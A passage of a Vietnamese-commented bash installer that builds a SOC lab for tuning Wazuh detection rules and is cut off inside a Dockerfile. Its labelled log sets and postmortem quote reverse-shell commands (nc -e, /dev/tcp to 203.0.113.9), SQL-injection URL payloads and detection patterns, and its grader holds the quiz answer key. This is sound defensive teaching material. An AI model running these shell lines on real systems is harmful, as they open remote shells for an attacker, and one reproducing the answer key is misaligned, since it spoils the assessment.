#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-detection-tuning (Bai 16 - Tinh chinh phat hien, do FP/FN) tren VM Labtainers.
# Chay tren VM:  bash install-soc-detection-tuning.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-detection-tuning
# (siem = anh chung soc-wazuh -> can co localhost:5000/soc-wazuh.)
#
# V1 (Huong B): 2 ho KHONG-tan-suat (reverse shell + SQLi), cham bang wazuh-logtest per-line.
#   - 1 container siem (an dap an): SV sua ~/luat/local_rules.xml, chay kiem-thu-luat (phat lai TAP DEV),
#     cham bang prestop (phat lai TAP AN root:0600). Khong restart manager (logtest doc luat tu file).
#   - Khong co du doan/phan tu. Nguong dat: precision >= 0.90 VA recall >= 0.90 moi ho tren tap an.
# (File nay SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-detection-tuning
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB/config" "$LAB/siem/_bin" "$LAB/siem/luat/.goc" "$LAB/siem/dev" "$LAB/siem/yeu-cau" "$LAB/dockerfiles" "$LAB/docs" "$LAB/instr_config"

# ======================================================================
# config/about.txt
# ======================================================================
cat > "$LAB/config/about.txt" <<'__TUN__'
SOC Lab - Tinh chỉnh phát hiện, đo FP/FN (soc-detection-tuning). Hai luật đang ngập Tier-1 bằng báo giả
nên analyst đã lờ - và một reverse shell + một SQLi mã hóa đã lọt qua. Nhiệm vụ: sửa 2 luật cho đáng tin
lại - cắt báo giả (precision) mà không bỏ sót (recall). Đo bằng cách phát lại một tập log có nhãn qua
wazuh-logtest, tính precision/recall từng họ. Đạt khi precision >= 0.90 và recall >= 0.90 mỗi họ trên tập ẩn.
__TUN__

# ======================================================================
# config/parameter.config
# ======================================================================
cat > "$LAB/config/parameter.config" <<'__TUN__'
# parameter.config - soc-detection-tuning.
# V1 dung tap an CO DINH (nhung THAT SU an: root:0600 tren siem, SV khong doc duoc).
# Per-student hoa tap an de danh cho v2.
__TUN__

# ======================================================================
# config/start.config
# ======================================================================
cat > "$LAB/config/start.config" <<'__TUN__'
# start.config - Lab soc-detection-tuning (Tinh chinh phat hien, do FP/FN)
# 1 container: siem (Wazuh - SV sua luat + cham). Dap an (tap an) root:0600, SV khong doc duoc.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-detection-tuning_student_master_seed
	GRADE_CONTAINER siem

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- SIEM: Wazuh. SV lam bai o day (terminal). ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	TERMINALS 1
__TUN__

# ======================================================================
# siem/_bin/fixlocal.sh  (anh soc-wazuh KHONG chay boot-hook -> file nay KHONG duoc goi)
# ======================================================================
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__TUN__'
#!/bin/bash
# LUU Y: anh chung soc-wazuh KHONG chay boot-hook Labtainers nen file nay KHONG duoc goi.
# Toan bo cai dat (luat goc, decoder, tap an, helper, sudoers, entrypoint) da duoc BAKE vao Dockerfile.
exit 0
__TUN__

# ======================================================================
# siem/_bin/thu-dong  (chay 1 dong log qua logtest) -> ~/.local/bin/thu-dong (tren PATH)
# ======================================================================
cat > "$LAB/siem/_bin/thu-dong" <<'__TUN__'
#!/bin/bash
# thu-dong "<dong log>" : chay 1 dong qua wazuh-logtest, in decoder/truong/luat no.
# LUU Y logtest: ket qua in ra STDERR; KHONG pipe STDOUT (segfault). Nen: stdout -> /dev/null.
if [ -z "$1" ]; then echo 'Dung: thu-dong "<dong log>"'; exit 1; fi
printf '%s\n' "$1" | sudo /var/ossec/bin/wazuh-logtest 2>&1 >/dev/null | sed -n '1,60p'
__TUN__

# ======================================================================
# siem/_bin/kiem-thu-luat  (nap luat + phat lai TAP DEV + in precision/recall)
# ======================================================================
cat > "$LAB/siem/_bin/kiem-thu-luat" <<'__TUN__'
#!/bin/bash
# kiem-thu-luat: nap ~/luat/local_rules.xml vao Wazuh, phat lai TAP DEV (co nhan),
#   in TP/FP/FN + precision/recall tung ho + liet ke dong FP/FN de sua.
# Khong restart manager: wazuh-logtest doc luat tu FILE tren dia.
# Dai ID: reverse shell 100230-100249 ; SQLi 100250-100269.
set -u
LUAT="$HOME/luat/local_rules.xml"
[ -f "$LUAT" ] || { echo "Khong thay $LUAT"; exit 1; }

# 1) Nap luat (cai vao /var/ossec de logtest + prestop doc duoc)
sudo /usr/local/bin/nap-luat "$LUAT" || { echo "!! Loi cu phap luat - sua roi chay lai."; exit 1; }

# 2) Ham cham 1 ho tren 1 file .tsv (dong: NHAN<TAB>dong_log ; NHAN = M (doc) hoac B (lanh))
#    echo "TP FP FN TN"
score_family(){
  local f="$1" lo="$2" hi="$3" lbl line rid tp=0 fp=0 fn=0 tn=0 fired
  while IFS=$'\t' read -r lbl line; do
    [ -z "${lbl:-}" ] && continue
    case "$lbl" in \#*) continue;; esac
    rid=$(printf '%s\n' "$line" | sudo /var/ossec/bin/wazuh-logtest 2>&1 >/dev/null \
          | grep -oE "id: '1002[0-9][0-9]'" | grep -oE '[0-9]+' | tail -1)
    fired=0
    if [ -n "$rid" ] && [ "$rid" -ge "$lo" ] && [ "$rid" -le "$hi" ]; then fired=1; fi
    if [ "$lbl" = "M" ]; then
      [ "$fired" = 1 ] && tp=$((tp+1)) || { fn=$((fn+1)); echo "  [FN bo sot] $line" >&2; }
    else
      [ "$fired" = 1 ] && { fp=$((fp+1)); echo "  [FP bao gia] $line" >&2; } || tn=$((tn+1))
    fi
  done < "$f"
  echo "$tp $fp $fn $tn"
}

pct(){ # pct <tu so> <mau so> -> phan tram nguyen (mau=0 -> 0)
  if [ "$2" -eq 0 ]; then echo 0; else echo $(( $1 * 100 / $2 )); fi
}

SUMMARY=""
run_one(){ # run_one <ten> <tsv> <lo> <hi> : in chi tiet ra terminal, gom tom tat vao SUMMARY
  local name="$1" f="$2" lo="$3" hi="$4" tp fp fn tn prec rec
  echo "================ $name ================"
  read -r tp fp fn tn < <(score_family "$f" "$lo" "$hi")
  prec=$(pct "$tp" "$((tp+fp))"); rec=$(pct "$tp" "$((tp+fn))")
  echo "  TP=$tp  FP=$fp  FN=$fn  TN=$tn"
  echo "  precision=${prec}%   recall=${rec}%"
  SUMMARY="$SUMMARY $name P=$prec R=$rec"
}

echo ">>> Phat lai TAP DEV (tu danh gia - diem that cham tren tap an khi checkwork):"
run_one "reverse-shell" "$HOME/dev/shell.tsv" 100230 100249
run_one "sqli"          "$HOME/dev/web.tsv"   100250 100269

# 3) Ghi lich su (dung cho tieu chi baseline_measured)
echo "$(date +%s)$SUMMARY" >> "$HOME/.ktl-history"
echo ""
echo ">>> Muc tieu: precision >= 90% VA recall >= 90% moi ho (do tren TAP AN khi checkwork)."
__TUN__

# ======================================================================
# siem/_bin/prestop  (cham that: phat lai TAP AN root:0600 qua logtest)
# ======================================================================
cat > "$LAB/siem/_bin/prestop" <<'__TUN__'
#!/bin/bash
# Cham soc-detection-tuning tren siem: phat lai TAP AN (/root/.hidden/*.tsv, root:0600) qua logtest,
# tinh precision/recall moi ho. Chi in MARKER OK, KHONG in dap an / noi dung kich ban.
trap "echo Timed out; exit" SIGTERM
echo "PRESTOP_MARKER"

HID=/root/.hidden
RULES=/var/ossec/etc/rules/local_rules.xml
UHOME=/home/ubuntu

# ===== Marker RE (chi doc file - in TRUOC de chac chan co, phong khi bi cat) =====
# --- do_dac_ok: >=3/4 cau trong ~/do-dac.txt (dap an D1=2 D2=2 D3=2 D4=1) ---
gd(){ sed -n "s/^$1=//p" "$UHOME/do-dac.txt" 2>/dev/null | head -1 | tr -cd '0-9'; }
declare -A KD=( [D1]=2 [D2]=2 [D3]=2 [D4]=1 )
dok=0
for q in D1 D2 D3 D4; do [ "$(gd $q)" = "${KD[$q]}" ] && dok=$((dok+1)); done
[ "$dok" -ge 3 ] && echo "DO_DAC_OK"

# --- baseline_measured: lich su co >=1 lan precision <75 (da do luat goc truoc khi sua) ---
if [ -f "$UHOME/.ktl-history" ]; then
  low=$(grep -oE 'P=[0-9]+' "$UHOME/.ktl-history" | grep -oE '[0-9]+' | awk '$1<75{c++} END{print c+0}')
  [ "${low:-0}" -ge 1 ] && echo "BASELINE_MEASURED"
fi

# --- rules_ok: cu phap nap duoc + luat muc >=10 co <mitre> + ID dung dai (1 lan logtest) ---
syn=$(printf 'x\n' | /var/ossec/bin/wazuh-logtest 2>&1 >/dev/null | grep -ciE 'error|cannot load|invalid')
nr=$(grep -cE 'rule id="1002[0-9][0-9]"' "$RULES" 2>/dev/null || echo 0)
nm=$(grep -cE '<mitre>' "$RULES" 2>/dev/null || echo 0)
mitre_bad=0; [ "$nm" -lt "$nr" ] && mitre_bad=1
outrange=$(grep -oE 'rule id="[0-9]+"' "$RULES" 2>/dev/null | grep -oE '[0-9]+' \
           | awk '$1<100230 || $1>100269{c++} END{print c+0}')
[ "$syn" -eq 0 ] && [ "$mitre_bad" -eq 0 ] && [ "$outrange" -eq 0 ] && echo "RULES_OK"

# ===== shell_ok / web_ok: GOM logtest 1 LAN/HO (nap ruleset 1 lan, xu ly nhieu dong) =====
# Moi-dong-mot-lan qua cham (~52 lan nap ruleset) -> stoplab timeout cat prestop. Gom lai -> vai giay.
score_family(){ # <tsv> <lo> <hi> -> "TP FP FN TN"
  local f="$1" lo="$2" hi="$3" lbl line stream="" fired i tp=0 fp=0 fn=0 tn=0 fl
  local -a LBL=() FA=()
  while IFS=$'\t' read -r lbl line; do
    [ -z "${lbl:-}" ] && continue
    case "$lbl" in \#*) continue;; esac
    LBL+=("$lbl"); stream="$stream$line"$'\n'
  done < "$f"
  # awk: moi dong input sinh 1 block bat dau "**Phase 1"; in 0/1 (co luat 1002xx trong dai no khong) theo thu tu.
  fired=$(printf '%s' "$stream" | /var/ossec/bin/wazuh-logtest 2>&1 >/dev/null \
    | awk -v lo="$lo" -v hi="$hi" '
        /\*\*Phase 1/ { if(seen) print f; f=0; seen=1; next }
        match($0, /id: .1002[0-9][0-9]./) {
          s=substr($0,RSTART,RLENGTH); match(s,/1002[0-9][0-9]/); id=substr(s,RSTART,RLENGTH)+0
          if(id>=lo && id<=hi) f=1
        }
        END { if(seen) print f }')
  FA=($fired)
  for i in "${!LBL[@]}"; do
    fl="${FA[$i]:-0}"
    if [ "${LBL[$i]}" = "M" ]; then
      [ "$fl" = 1 ] && tp=$((tp+1)) || fn=$((fn+1))
    else
      [ "$fl" = 1 ] && fp=$((fp+1)) || tn=$((tn+1))
    fi
  done
  echo "$tp $fp $fn $tn"
}
pct(){ if [ "$2" -eq 0 ]; then echo 0; else echo $(( $1 * 100 / $2 )); fi; }
fam_ok(){ # <tsv> <lo> <hi> -> echo "PREC REC" + return 0 neu ca hai >=90
  local tp fp fn tn prec rec
  read -r tp fp fn tn < <(score_family "$1" "$2" "$3")
  prec=$(pct "$tp" "$((tp+fp))"); rec=$(pct "$tp" "$((tp+fn))")
  echo "$prec $rec"
  [ "$prec" -ge 90 ] && [ "$rec" -ge 90 ]
}
# Bat $? cua fam_ok qua $(), KHONG qua process-sub.
OUT=$(fam_ok "$HID/shell.tsv" 100230 100249); RC=$?; set -- $OUT; SP=${1:-0}; SR=${2:-0}
[ "$RC" -eq 0 ] && echo "SHELL_OK"
OUT=$(fam_ok "$HID/web.tsv"   100250 100269); RC=$?; set -- $OUT; WP=${1:-0}; WR=${2:-0}
[ "$RC" -eq 0 ] && echo "WEB_OK"
# so lieu cho do an (khong phai dap an - la diem cua chinh SV)
echo "SHELL_PREC=${SP} SHELL_REC=${SR}"
echo "WEB_PREC=${WP} WEB_REC=${WR}"

exit 0
__TUN__

# ======================================================================
# siem/luat/local_rules.xml  (ban lam viec = 2 luat "on", co loi ca 2 chieu)
# siem/luat/.goc/local_rules.xml = ban nguyen trang de SV so/khoi phuc
# ======================================================================
cat > "$LAB/siem/luat/local_rules.xml" <<'__TUN__'
<!-- Ban lam viec cua SINH VIEN. Sua 2 luat duoi cho precision>=0.9 va recall>=0.9 moi ho.
     Giu dung dai ID: reverse shell 100230-100249 ; SQLi 100250-100269.
     Moi luat muc >=10 phai co <mitre>. Decoder procmon + web-accesslog da co san (khong can sua).
     Goi y: reverse shell khop <field name="command"> (truong dong). SQLi khop URL bang THE <url> - url la
     truong STATIC nen KHONG dung <field name="url"> (se bao "Field 'url' is static"); <url type="pcre2"> OK.
     Reverse shell dung <decoded_as>procmon</decoded_as>; SQLi dung <if_sid>31100</if_sid> (chuoi web access-log,
     de luat muc cao thang luat built-in). URL trong log da MA HOA khoang trang (%20/+) va dau nhay (%27). -->
<group name="local,detection_tuning,">

  <!-- ===== Ho REVERSE SHELL (100230-100249) : luat GOC "on" - khop chuoi con "nc" tren CA DONG ===== -->
  <rule id="100230" level="10">
    <decoded_as>procmon</decoded_as>
    <match>nc</match>
    <description>Reverse shell suspected: netcat (BAN GOC - nhieu bao gia)</description>
    <mitre><id>T1059</id></mitre>
  </rule>

  <!-- ===== Ho SQL INJECTION (100250-100269) : luat GOC "on" - khop tu khoa tren CA DONG ===== -->
  <rule id="100250" level="10">
    <if_sid>31100</if_sid>
    <regex>select|union|or 1=1</regex>
    <description>SQL injection suspected (BAN GOC - nhieu bao gia)</description>
    <mitre><id>T1190</id></mitre>
  </rule>

</group>
__TUN__
cp "$LAB/siem/luat/local_rules.xml" "$LAB/siem/luat/.goc/local_rules.xml"

# ======================================================================
# siem/svc-da-duyet.csv  (danh muc da duyet, co cot trang thai)
# ======================================================================
cat > "$LAB/siem/svc-da-duyet.csv" <<'__TUN__'
loai,gia_tri,trang_thai,ghi_chu
proc,/opt/monitoring/health-nc,approved,Agent giám sát sức khỏe (tên chứa "nc" nhưng hợp lệ)
proc,/usr/bin/rsync,approved,Đồng bộ sao lưu định kỳ của quản trị
ua,CorpMonitor/1.0,approved,User-agent công cụ giám sát nội bộ (quét trang)
proc,/opt/legacy/dns-sync,retired,DỊCH VỤ ĐÃ NGƯNG - domain đã hết hạn (KHÔNG dùng làm ngoại lệ)
__TUN__

# ======================================================================
# siem/yeu-cau/  (2 yeu cau Tier-1 + trich postmortem)
# ======================================================================
cat > "$LAB/siem/yeu-cau/yc-01-reverse-shell.txt" <<'__TUN__'
YÊU CẦU TINH CHỈNH #01 (Tier-1 gửi)
Luật reverse shell (100230-100249) mỗi đêm báo hàng chục lần trên lệnh rsync của quản trị và agent
giám sát /opt/monitoring/health-nc - toàn báo giả vì nó khớp chuỗi con "nc". Analyst đã bắt đầu lờ.
Đồng thời, hậu kiểm cho thấy một reverse shell THẬT bằng 'bash -c ... /dev/tcp/...' KHÔNG hề báo.
Yêu cầu: sửa luật để (a) không báo trên rsync / health-nc, (b) bắt được các kiểu mở shell không dùng
chuỗi cố định (/dev/tcp, trình thông dịch mở socket, ncat -e).
__TUN__
cat > "$LAB/siem/yeu-cau/yc-02-sqli.txt" <<'__TUN__'
YÊU CẦU TINH CHỈNH #02 (Tier-1 gửi)
Luật SQLi (100250-100269) báo giả mỗi khi khách TÌM KIẾM sản phẩm có chữ "select"/"union" (vd
q=select a gift) hay tham số marketing. Đồng thời, cuộc tấn công THẬT dùng mã hóa URL (%27), chú thích
chèn giữa từ khóa (uni/**/on) và chữ HOA (UNION ALL SELECT) thì LỌT qua.
Yêu cầu: chỉ xét trường URL, nhận diện CẤU TRÚC câu truy vấn bị chèn (từ khóa cạnh nhau qua khoảng
trắng / chú thích / mã hóa) thay vì sự xuất hiện của một từ; bắt được biến thể mã hóa & chữ HOA.
__TUN__
cat > "$LAB/siem/yeu-cau/postmortem.txt" <<'__TUN__'
TRÍCH POSTMORTEM (hậu kiểm sự cố)
- Reverse shell trên db-core được mở bằng: bash -c 'sh -i >& /dev/tcp/203.0.113.X/443 0>&1'.
  Luật cũ không có "nc" nên im lặng.
- SQLi rút dữ liệu dùng: /item?id=1%27%20UNION%20ALL%20SELECT... (mã hóa URL + chữ HOA).
  Luật cũ khớp từ thường "union"/"select" nên trượt.
- Bài học: khớp chuỗi con trên cả dòng log vừa báo giả (lẫn vào từ khác) vừa dễ bị né (mã hóa/chú thích).
__TUN__

# ======================================================================
# siem/do-dac.txt  (phieu cau hoi goc re - dap an co dinh, cham tu dong)
# ======================================================================
cat > "$LAB/siem/do-dac.txt" <<'__TUN__'
# PHIẾU ĐO ĐẠC - trả lời bằng 1 chữ số sau dấu '=' (xem ~/yeu-cau + dùng thu-dong để soi).

# D1: Vì sao luật reverse shell GỐC nổ trên lệnh rsync của quản trị?
#   1 = rsync thực sự mở một shell
#   2 = luật khớp chuỗi con "nc" nằm bên trong từ khác (rsync, sync, health-nc)
#   3 = máy quản trị đã bị nhiễm
#   4 = decoder đọc sai trường
D1=

# D2: Vì sao SQLi dạng "uni/**/on sel/**/ect" bị BỎ SÓT?
#   1 = nó không nằm trong trường URL
#   2 = chú thích /**/ cắt đôi từ khóa nên phép khớp 1-từ thất bại
#   3 = nó ở chữ HOA
#   4 = sai mức cảnh báo
D2=

# D3: Vì sao "UNION ALL SELECT" (chữ HOA) bị BỎ SÓT?
#   1 = nó là lệnh hợp lệ
#   2 = luật gốc khớp PHÂN BIỆT hoa/thường nên không trùng từ thường "union"
#   3 = URL quá dài
#   4 = decoder web-accesslog không chạy
D3=

# D4: Cách ĐÚNG để không báo trên agent giám sát đã duyệt là gì?
#   1 = loại trừ theo TRƯỜNG cụ thể (đường dẫn tiến trình) lấy từ danh mục đã duyệt, chỉ dòng còn hiệu lực
#   2 = loại trừ theo máy nguồn
#   3 = hạ mức cảnh báo xuống dưới 10
#   4 = xóa hẳn luật
D4=
__TUN__

# ======================================================================
# siem/thay-doi-luat.md  (giang vien cham tay)
# ======================================================================
cat > "$LAB/siem/thay-doi-luat.md" <<'__TUN__'
# Ghi chú thay đổi luật (giảng viên chấm tay - 4 ý mỗi luật)

## Reverse shell (100230-100249)
- Gốc rễ FP:
- Gốc rễ FN:
- Thay đổi đã làm:
- Số liệu trước/sau + rủi ro còn lại (kẻ tấn công còn né bằng cách nào):

## SQL injection (100250-100269)
- Gốc rễ FP:
- Gốc rễ FN:
- Thay đổi đã làm:
- Số liệu trước/sau + rủi ro còn lại:
__TUN__

# ======================================================================
# siem/dev/shell.tsv  (TAP DEV reverse shell - CO NHAN, SV xem duoc)
#   NHAN<TAB>dong log procmon. M = reverse shell that ; B = lanh.
# ======================================================================
printf '%s\n' \
'# NHAN<TAB>dong log. M=reverse shell that, B=lanh. (Dinh dang: host procmon: exe=... cmd="...")' \
'B	Nov 18 02:01:10 web01 procmon: exe=/usr/bin/vim cmd="vim /etc/hosts" user=root' \
'B	Nov 18 02:03:22 web01 procmon: exe=/usr/bin/rsync cmd="rsync -avz /data /backup/web01" user=root' \
'B	Nov 18 02:05:40 db-core procmon: exe=/usr/bin/sync cmd="sync" user=root' \
'B	Nov 18 02:07:01 app02 procmon: exe=/opt/monitoring/health-nc cmd="health-nc --scan --interval 60" user=monit' \
'B	Nov 18 02:09:12 web01 procmon: exe=/usr/bin/apt cmd="apt-get update" user=root' \
'B	Nov 18 02:11:30 db-core procmon: exe=/usr/bin/psql cmd="psql -c select now()" user=postgres' \
'B	Nov 18 02:13:03 app02 procmon: exe=/bin/tar cmd="tar czf /tmp/logs.tgz /var/log" user=root' \
'B	Nov 18 02:15:44 web01 procmon: exe=/usr/bin/curl cmd="curl -s https://repo.internal/ping" user=www-data' \
'M	Nov 18 02:20:05 db-core procmon: exe=/bin/nc cmd="nc -e /bin/bash 203.0.113.9 4444" user=www-data' \
'M	Nov 18 02:21:18 db-core procmon: exe=/usr/bin/ncat cmd="ncat -e /bin/sh 203.0.113.9 4444" user=www-data' \
'M	Nov 18 02:22:40 db-core procmon: exe=/bin/bash cmd="bash -c sh -i >& /dev/tcp/203.0.113.9/443 0>&1" user=www-data' \
'M	Nov 18 02:23:55 app02 procmon: exe=/usr/bin/python3 cmd="python3 -c import socket,subprocess,os;s=socket.socket();s.connect((203.0.113.9,443))" user=app' \
'M	Nov 18 02:25:10 web01 procmon: exe=/usr/bin/perl cmd="perl -e use Socket;socket(S,2,1,6);connect(S,...)" user=www-data' \
> "$LAB/siem/dev/shell.tsv"

# ======================================================================
# siem/dev/web.tsv  (TAP DEV SQLi - CO NHAN)
#   NHAN<TAB>dong Apache access log.
# ======================================================================
printf '%s\n' \
'# NHAN<TAB>dong Apache access log. M=SQLi that, B=lanh (tim kiem / marketing / binh thuong).' \
'B	10.0.2.15 - - [18/Nov/2025:02:01:00 +0000] "GET /index.html HTTP/1.1" 200 1203' \
'B	10.0.2.15 - - [18/Nov/2025:02:02:00 +0000] "GET /search?q=select+a+nice+gift HTTP/1.1" 200 842' \
'B	10.0.2.15 - - [18/Nov/2025:02:03:00 +0000] "GET /products?category=union+jack+flags HTTP/1.1" 200 911' \
'B	10.0.2.15 - - [18/Nov/2025:02:04:00 +0000] "GET /blog/how-to-select-a-laptop HTTP/1.1" 200 1500' \
'B	10.0.2.15 - - [18/Nov/2025:02:05:00 +0000] "GET /cart?utm_campaign=order_now HTTP/1.1" 200 640' \
'B	10.0.2.15 - - [18/Nov/2025:02:06:00 +0000] "GET /api/health HTTP/1.1" 200 12' \
'B	10.0.2.15 - - [18/Nov/2025:02:07:00 +0000] "GET /p/1234 HTTP/1.1" 200 2048' \
'B	10.0.2.15 - - [18/Nov/2025:02:08:00 +0000] "GET /search?q=red+shoes HTTP/1.1" 200 530' \
'M	203.0.113.9 - - [18/Nov/2025:02:20:00 +0000] "GET /item?id=1+union+select+user,pass+from+users-- HTTP/1.1" 200 148302' \
'M	203.0.113.9 - - [18/Nov/2025:02:21:00 +0000] "GET /login?u=admin%27+or+1=1-- HTTP/1.1" 200 512' \
'M	203.0.113.9 - - [18/Nov/2025:02:22:00 +0000] "GET /item?id=1%27%20UNION%20ALL%20SELECT%20pass%20FROM%20users HTTP/1.1" 200 90210' \
'M	203.0.113.9 - - [18/Nov/2025:02:23:00 +0000] "GET /item?id=1+UNION+ALL+SELECT+pass+FROM+users HTTP/1.1" 200 77001' \
'M	203.0.113.9 - - [18/Nov/2025:02:24:00 +0000] "GET /item?id=1+uni/**/on+sel/**/ect+pass+FROM+users HTTP/1.1" 200 65000' \
> "$LAB/siem/dev/web.tsv"

# ======================================================================
# docs/read_first.txt
# ======================================================================
cat > "$LAB/docs/read_first.txt" <<'__TUN__'
================================================================================
 SOC LAB: TINH CHỈNH PHÁT HIỆN, ĐO FP/FN (soc-detection-tuning)
================================================================================

1. BỐI CẢNH
--------------------------------------------------------------------------------
Hai luật của SOC đang làm ngập hàng đợi Tier-1 bằng BÁO GIẢ (reverse shell + SQLi) nên analyst đã lờ
chúng - và một reverse shell thật cùng một SQLi mã hóa đã LỌT qua mà không hề cảnh báo. Việc của bạn:
SỬA 2 luật cho đáng tin trở lại - cắt báo giả (tăng precision) mà không bỏ sót (giữ recall). Chấm bằng
cách phát lại một tập log đã gán nhãn qua wazuh-logtest, rồi tính precision/recall cho từng họ.

2. ĐỒ NGHỀ (trên máy này - siem)
--------------------------------------------------------------------------------
  ~/luat/local_rules.xml : BẢN LÀM VIỆC - sửa 2 luật ở đây (bản gốc lưu ở ~/luat/.goc/)
  ~/dev/shell.tsv ~/dev/web.tsv : TẬP DEV đã gán nhãn (M=độc hại, B=lành) - để tự kiểm và soi FP/FN
  ~/svc-da-duyet.csv     : danh mục dịch vụ đã duyệt (đường dẫn tiến trình / user-agent) + cột trạng thái approved/retired
  ~/yeu-cau/             : 2 yêu cầu tinh chỉnh của Tier-1 + trích đoạn postmortem
  ~/do-dac.txt           : phiếu câu hỏi gốc rễ (chấm tự động)
  ~/thay-doi-luat.md     : ghi chú thay đổi luật (giảng viên chấm tay)
  thu-dong "<dong log>"  : chạy 1 dòng qua wazuh-logtest -> xem decoder / các trường / luật nào nổ
  kiem-thu-luat          : nạp luật + phát lại TẬP DEV + in precision/recall từng họ + liệt kê dòng FP/FN
                           (chạy KHÔNG kèm sudo - script tự sudo đúng 2 lệnh được phép)

  LƯU Ý: decoder (procmon + web-accesslog) đã có sẵn - KHÔNG cần sửa. Bạn chỉ sửa LUẬT.
         wazuh-logtest đọc luật trực tiếp từ FILE nên KHÔNG cần khởi động lại manager; chỉ cần chạy kiem-thu-luat.

3. DẢI ID (giữ đúng, không được đổi):  reverse shell 100230-100249 ; SQLi 100250-100269.
   Trường có sẵn:  reverse shell -> <field name="exe"> , <field name="command">  (dùng <field name=...>)
                   SQLi          -> trường url là STATIC -> khớp bằng thẻ <url> (KHÔNG dùng <field name="url">)

4. NHIỆM VỤ
--------------------------------------------------------------------------------
 B1. ĐO BASELINE & TÌM GỐC RỄ: chạy `kiem-thu-luat` trên luật gốc (precision sẽ rất thấp).
     Dùng `thu-dong "<dong>"` để soi vài dòng FP/FN (xem luật nào nổ, nổ trên trường nào). Điền vào ~/do-dac.txt.

 B2. VIẾT LẠI 2 LUẬT sao cho precision >= 90% VÀ recall >= 90% ở mỗi họ:
     - Reverse shell: khớp trên TRƯỜNG (exe/command), NEO đúng tên; bao phủ /dev/tcp, trình thông dịch mở
       socket, ncat kèm cờ thực thi (-e); loại trừ agent đã duyệt theo ĐƯỜNG DẪN (không loại trừ theo máy).
     - SQLi: chỉ xét URL (khớp bằng thẻ <url>, KHÔNG <field name="url">); nhận diện CẤU TRÚC câu truy vấn bị chèn (từ khóa cạnh nhau qua
       khoảng trắng / chú thích / mã hóa) thay vì sự xuất hiện của một từ; bắt được %27, chú thích /**/ và
       chữ HOA (dùng (?i) với pcre2).
     Mỗi luật mức >=10 BẮT BUỘC có <mitre>.

 B3. LẶP đo - sửa cho đến khi đạt, rồi ghi ~/thay-doi-luat.md (4 ý mỗi luật). (Giảng viên chấm tay.)

5. NỘP BÀI - CÁC MỤC CHẤM (checkwork, đo trên TẬP ẨN - khác tập dev, có thêm biến thể)
--------------------------------------------------------------------------------
  do_dac_ok        : đúng >= 3/4 câu trong ~/do-dac.txt
  baseline_measured: có đo baseline (chạy kiem-thu-luat trên luật gốc trước khi sửa)
  shell_ok         : reverse shell precision >= 90% VÀ recall >= 90% trên tập ẩn
  web_ok           : SQLi precision >= 90% VÀ recall >= 90% trên tập ẩn
  rules_ok         : cú pháp hợp lệ + luật mức >=10 có <mitre> + ID đúng dải
  Luật im lặng hoàn toàn -> precision = 0 (theo quy ước). Đừng liệt kê đúng từng giá trị của tập dev -
  tập ẩn là một tập khác, làm vậy sẽ trượt.
__TUN__

# ======================================================================
# instr_config/goals.config
# ======================================================================
cat > "$LAB/instr_config/goals.config" <<'__TUN__'
# goals.config - soc-detection-tuning. Cham VIEC SV LAM tren ~/luat/local_rules.xml (do FP/FN tap an).
# (thay-doi-luat.md: giang vien cham tay - khong cham tu dong.)
# Dung result cw_* (chi xet ban prestop.stdout MOI NHAT) - tranh loi "tung dung la dau vinh vien".

do_dac           = boolean : cw_dodac
baseline_measured = boolean : cw_baseline
shell_ok         = boolean : cw_shell
web_ok           = boolean : cw_web
rules_ok         = boolean : cw_rules
__TUN__

# ======================================================================
# instr_config/results.config
# ======================================================================
cat > "$LAB/instr_config/results.config" <<'__TUN__'
# results.config - soc-detection-tuning. Prestop (siem) in marker OK, khong lo dap an.
# Goal tro thang vao result cw_* (latest-only). KHONG dung result _* (bi quet moi timestamp -> sticky).

# --- Goi y checkwork ---
#CHECK_TRUE: Chua du 3/4 cau ~/do-dac.txt - doc ~/yeu-cau + dung thu-dong soi goc re FP/FN roi dien lai.
cw_dodac = siem:prestop.stdout : FILE_REGEX : DO_DAC_OK
#CHECK_TRUE: Chua do baseline - chay `kiem-thu-luat` (khong sudo) tren luat GOC (truoc khi sua) de thay precision thap.
cw_baseline = siem:prestop.stdout : FILE_REGEX : BASELINE_MEASURED
#CHECK_TRUE: Luat reverse shell chua dat - precision>=90 va recall>=90 tren tap an. Khop tren truong exe/command, neo ten; phu /dev/tcp, socket, ncat -e; loai agent da duyet theo duong dan.
cw_shell = siem:prestop.stdout : FILE_REGEX : SHELL_OK
#CHECK_TRUE: Luat SQLi chua dat - precision>=90 va recall>=90 tren tap an. Chi xet URL (the <url>, khong <field name=url>), nhan dien cau truc chen (%27, /**/, chu HOA voi (?i)) thay vi mot tu khoa.
cw_web = siem:prestop.stdout : FILE_REGEX : WEB_OK
#CHECK_TRUE: Luat chua hop le - kiem cu phap, moi luat muc >=10 phai co <mitre>, ID giu dung dai 100230-100269.
cw_rules = siem:prestop.stdout : FILE_REGEX : RULES_OK
__TUN__

# ======================================================================
# dockerfiles/Dockerfile.soc-detection-tuning.siem.student
#   - bake: decoder procmon, luat goc da nam o home (ADD) -> cai vao /var/ossec khi build,
#     tap an /root/.hidden (root:0600), sudoers cho ubuntu (chi nap-luat + logtest), entrypoint ensure_mgr.
# ======================================================================
cat > "$LAB/dockerfiles/Dockerfile.soc-detection-tuning.siem.student" <<'__TUN__'
#
# siem - dung image nen soc-wazuh (Wazuh cai san). Anh soc-wazuh KHONG chay boot-hook Labtainers
# nen TOAN BO cai dat (decoder, luat goc, tap an, helper, sudoers, entrypoint) duoc BAKE o day.
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Locale UTF-8 de nano/editor xu ly tieng Viet co dau dung (cat van OK du locale C, nhung nano thi khong).
# Labtainers mo terminal bang LOGIN session (PAM/su -) -> ENV cua Docker bi reset; phai ghi locale vao
